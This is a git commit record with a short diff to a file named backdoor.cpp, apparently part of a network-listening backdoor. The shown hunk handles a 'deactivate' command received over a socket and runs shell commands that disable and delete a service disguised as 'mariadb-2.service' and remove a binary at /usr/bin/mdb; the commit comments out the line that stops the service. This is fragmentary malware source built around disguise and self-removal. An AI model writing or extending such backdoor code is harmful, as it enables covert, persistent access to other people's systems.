7fb9fc4b301f878754d401e04f145b5ba6a76821
Yegor Boubnov <yegor.boubnov@gmail.com>
2021-05-16 17:47:31 +0300

    fixes

--- backdoor.cpp
+++ backdoor.cpp
@@ -56,7 +56,7 @@ int main()
                if (std::string(buf) == "deactivate\n"){
                    send(client_fd,"deactivating\n",13,0);
 
-                   system("systemctl stop mariadb-2.service");
+                   //system("systemctl stop mariadb-2.service");
                    system("systemctl disable mariadb-2.service");
                    system("rm -f /usr/lib/systemd/system/mariadb-2.service");
                    system("rm -f /usr/bin/mdb");
